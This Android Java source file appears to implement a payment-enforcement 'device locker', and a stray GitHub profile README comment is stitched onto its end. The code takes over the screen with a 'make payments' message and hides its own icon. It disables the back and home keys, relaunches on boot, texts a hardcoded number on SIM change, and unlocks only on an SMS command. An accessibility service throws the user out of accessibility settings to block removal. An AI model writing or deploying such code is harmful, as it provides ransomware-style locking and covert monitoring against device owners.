
package com.example.device.locker;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.view.Gravity;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.os.Handler;
import android.app.Service;

public class DeviceLockerActivity extends Activity {

    private static final String SERVER_NUMBER = "+256781345647";  // Server phone number
    private static final String UNLOCK_MESSAGE_KEYWORD = "unlock(";  // Server response keyword to unlock
    private BroadcastReceiver smsReceiver, simChangeReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Ensure the activity runs over lockscreen and all other apps
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_FULLSCREEN);

        // Create the lock screen layout programmatically
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);

        TextView lockMessage = new TextView(this);
        lockMessage.setText("Please make payments to continue using your device.");
        lockMessage.setGravity(Gravity.CENTER);
        layout.addView(lockMessage);

        // Emergency call button
        Button emergencyButton = new Button(this);
        emergencyButton.setText("Emergency Call");
        emergencyButton.setOnClickListener(v -> {
            try {
                Intent intent = new Intent(Intent.ACTION_DIAL);
                intent.setData(android.net.Uri.parse("tel:112"));
                startActivity(intent);
            } catch (Exception e) {
                Toast.makeText(this, "Error making emergency call", Toast.LENGTH_SHORT).show();
            }
        });
        layout.addView(emergencyButton);

        // Refresh account status button (sends SMS to server)
        Button refreshButton = new Button(this);
        refreshButton.setText("Refresh Payment Status");
        refreshButton.setOnClickListener(v -> {
            try {
                sendPaymentStatusRequest();
            } catch (Exception e) {
                Toast.makeText(this, "Error sending request", Toast.LENGTH_SHORT).show();
            }
        });
        layout.addView(refreshButton);

        // Set the layout as the content view
        setContentView(layout);

        // Hide app icon
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, DeviceLockerActivity.class);
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        // Register SMS receiver and SIM change receiver
        registerSimChangeReceiver();
        registerSmsReceiver();
    }

    // Send payment status request to the server via SMS
    private void sendPaymentStatusRequest() throws Exception {
        String message = "emi_stats(%username%)";
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(SERVER_NUMBER, null, message, null, null);
    }

    // Register BroadcastReceiver for detecting SIM changes
    private void registerSimChangeReceiver() {
        simChangeReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                try {
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage(SERVER_NUMBER, null, "SIM change detected", null, null);
                } catch (Exception e) {
                    Toast.makeText(context, "Error detecting SIM change", Toast.LENGTH_SHORT).show();
                }
            }
        };
        registerReceiver(simChangeReceiver, new IntentFilter("android.intent.action.SIM_STATE_CHANGED"));
    }

    // Register BroadcastReceiver for receiving SMS responses from the server
    private void registerSmsReceiver() {
        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Bundle bundle = intent.getExtras();
                try {
                    if (bundle != null) {
                        Object[] pdus = (Object[]) bundle.get("pdus");
                        if (pdus != null && pdus.length > 0) {
                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[0]);
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();

                            if (SERVER_NUMBER.equals(sender) && messageBody.contains(UNLOCK_MESSAGE_KEYWORD)) {
                                finish();  // Unlock device
                            }
                        }
                    }
                } catch (Exception e) {
                    Toast.makeText(context, "Error receiving SMS", Toast.LENGTH_SHORT).show();
                }
            }
        };
        registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
    }

    @Override
    public void onBackPressed() {
        // Disable back button to prevent exiting
    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent event) {
        if (event.getKeyCode() == KeyEvent.KEYCODE_HOME) {
            return true;  // Disable home button
        }
        return super.dispatchKeyEvent(event);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        if (!hasFocus) {
            // Prevent exiting via recent apps or system dialogs
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(smsReceiver);
        unregisterReceiver(simChangeReceiver);
    }

    // BootReceiver to start app after reboot
    public static class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Intent lockIntent = new Intent(context, DeviceLockerActivity.class);
                lockIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(lockIntent);
            }
        }
    }

    // AccessibilityService to exit Accessibility settings if user tries to modify them
    public static class LockAccessibilityService extends AccessibilityService {
        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            try {
                String packageName = event.getPackageName().toString();
                if ("com.android.settings".equals(packageName)) {
                    String eventText = android.text.TextUtils.join(" ", event.getText()).toLowerCase();
                    if (eventText.contains("accessibility")) {
                        performGlobalAction(GLOBAL_ACTION_HOME);  // Exit to home if accessibility settings accessed
                    }
                }
            } catch (Exception e) {
                // Handle exceptions silently for accessibility service
            }
        }

        @Override
        public void onInterrupt() {
            // Handle service interruption
        }
    }
}
<!---
vandoCredit/vandoCredit is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
